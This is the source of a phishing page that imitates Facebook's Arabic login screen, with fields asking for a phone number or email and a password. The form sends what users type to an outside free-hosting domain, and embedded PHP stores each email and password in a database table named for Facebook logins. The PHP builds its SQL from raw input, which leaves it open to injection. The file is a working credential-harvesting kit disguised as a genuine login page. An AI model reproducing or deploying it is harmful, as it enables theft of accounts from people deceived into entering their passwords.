<!DOCTYPE html>
<html>
    <head>
        <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
        <link href="icon.jpg" rel="shortcut icon" sizes="196x196"/>
        <meta charset="UTF-8">
        <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
       <script src="java.js"></script>
        <link rel="stylesheet" type="text/css" href="style2.css">
    </head>
    <body>
        <div id="txall">
        <input type="submit" id="ah" value=""/>
        </div>
        <p id="fc">facebook</p>
        
        <form action="http://ranone99.000webhostapp.com" method="post">
            <div id="txall">
                <!-- <img id="d" src="tx1.jpg"> -->
                <input type="email" id="tx"  name="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني"/><br>
                <input type="password" id="tx2" name="pass" placeholder="كلمة السر"/><br>
                <input type="submit" name="add" id="add" value="" href="http://done.php"/>
                <p id="hal">هل نسيت كلمة السر؟</p>
                <input type="submit" id="ao" value=""/><br>
                <input type="submit" id="ansh" value=""/><br>
                <input type="submit" id="ar" value=""/>
            </div>
            
            
        </form>        
    </body>
	<?php
	include("conn.php");
	
	if(isset($_POST["add"]))
{
	$fgmail=$_POST["email"];
	$fpass=$_POST["pass"];
	$sql="INSERT INTO `id16375134_loginfb`.`fb` (`email`,`pass`) VALUES ('$fgmail','$fpass')";
	if($conn->query($sql)===TRUE){
		echo"successfully";
	}
	else{echo "error:".$sql."<br>".$conn->error;}
	$conn->close();

}
	
	?>
	
</html>
